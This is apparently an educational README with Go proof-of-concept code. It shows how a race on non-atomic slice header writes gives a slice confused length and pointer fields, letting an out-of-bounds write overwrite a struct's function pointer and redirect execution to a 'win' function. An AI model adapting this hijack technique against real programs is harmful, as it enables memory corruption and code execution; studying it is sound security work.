# Unsafe Slice Semantics
## Building
```
$ go run .
win 514 16
exit status 1
```

## Underlying slice structures
```go
type slice struct {
	array unsafe.Pointer
	len   int
	cap   int
}

// A notInHeapSlice is a slice backed by go:notinheap memory.
type notInHeapSlice struct {
	array *notInHeap
	len   int
	cap   int
}
```

## Slice Length Race
The `slice` type in Go is represented by an underlying structure composed of three fields:

* `array`: a pointer to the underlying array, either on the heap or in the stack.
* `len`: the length of the underlying array.
* `cap`: the capacity of the underlying array.

Because the `slice` type is effectively a proxy to the underlying array, operations performed agains the underlying array are not atomic. This allows us to either observe or manipulate memory adjacent to the underlying array.

```go
// StructFuncPtr is a structure containing a single field `funcptr`, which will be overridden by our slice assignment.
type StructFuncPtr struct {
	funcptr func()
}
```

Given the definition of `a`, `b`, and `confused` as slices of pointers to an integer, and `target` defined as an instance of `StructFuncPtr`, the following is the premise of the dangerous race:

1. `a` is assigned an array with a greater length than `b`.
2. `b` is assigned an array wigh a lesser length than `a`.
3. The value of `confused` is assigned back and forth in a loop between `a` and `b` after being initialized to `b`, in a separate coroutine `A`.
4. We attempt to assign an index of `a` to our attacker-controlled value in a separate coroutine `B`. This index is out-of-bounds for `b` but not for `a`.
5. A race is encountered within coroutine `B`, allowing us to overwrite into `target`'s `funcptr` field.
6. `target.funcptr` is executed, and coroutine `B` transitions into executing the attacker-specified function address.

In our [example](./main.go), we can observe this type of race in a pure form. We start by defining a `win` function to emulate an attacker-controlled value we are racing to execute. We also define an `address` function, which will let us calculate an integer-formatted address for use during the race.


```go
// Utility functions

// i and j hold loop counters for the `main` coroutine, and the spawned coroutine.
var i, j int

// address returns the integer address of a given parameter
func address(i interface{}) int {
	addr, err := strconv.ParseUint(fmt.Sprintf("%p", i), 0, 0)
	if err != nil {
		panic(err)
	}
	return int(addr)
}

// Win is a simple target because it expects no parameters, so we don't have to groom the stack.
func win() {
	fmt.Println("win", i, j)
	os.Exit(1)
}
```

We then define a structure `StructFuncPtr`, which contains a single field `funcptr`. This field is what we will attempt to overwrite during the race, allowing us to achieve control of execution in the main coroutine.

```go
// StructFuncPtr is a structure containing a single field `funcptr`, which will be overridden by our slice assignment.
type StructFuncPtr struct {
	funcptr func()
}
```

Within `main`, we then calculate the address of our `win` function, which serves as our example "attacker-controlled" value in our race. We can then initialize `a` and `b` to their initial slice values, `target` to a new instance of the `StructFuncPtr`, and confused to the value of `b`.

```go
	// Calculate the address of the win function so we can emulate the "attacker controlled" value
	winAddr := address(win)

	// Define the variables involved in the race:
	//
	// * `a`: The longer slice we will use to confuse the `length` attribute during the race.
	// * `b`: The shorter slice we will use when confused to overrite `target`'s `funcptr` field.
	// * `target`: The instance of `StructFuncPtr` which will be overridden into at the `funcptr` field.
	a := make([]*int, 2)
	b := make([]*int, 1)
    target := new(StructFuncPtr)
...
	// Instantiate `confused` to the value of `b` initially.
	confused := b
```

We can then spawn a coroutine to begin flipping the values of `confused` between `a` and `b`, allowing us to begin attempting our race.

```go
// Spawn a coroutine to flip the value of of confused between `a` and `b`, which will produce our race.
	go func() {
		for {
			confused = a

			// Keep this function from being optimized which would prevent the race.
			func() {
				if i >= 0 {
					return
				}
				fmt.Println(confused)
			}()

			confused = b
			i++
		}
	}()
```

Once spawned, the main coroutine then begins infinitely looping, attempting to assign index 1 to the `win` address. When the race condition is reached, `confused` will have the length of `a`, but point to `b`, allowing the assignment to succeed, but in fact overwrite `funcptr` within `target`. Because the `funcptr` is no longer `nil`, and instead points to `win`, we will subsequently execute our `win` function and exit.

```go
	// Spawn a coroutine to attempt to assign index 1 of `confused` to the win addr. This will result in
	// overwriting `target`'s `funcptr` field when `confused`s length is equal to `a`, but data points to `b`,
	// and we attempt to assign index 1 to the win address, as the win address will be put into the `funcptr`
	// field value.
	//
	// Once the `funcptr` has potentially been overwritten (which we detect based on whether `funcptr` is nil)
	// we can attempt to execute it.
	for {
		j++
		func() {
			defer func() { recover() }()
			confused[1] = &winAddr
		}()
		if target.funcptr != nil {
			target.funcptr()
		}
	}
```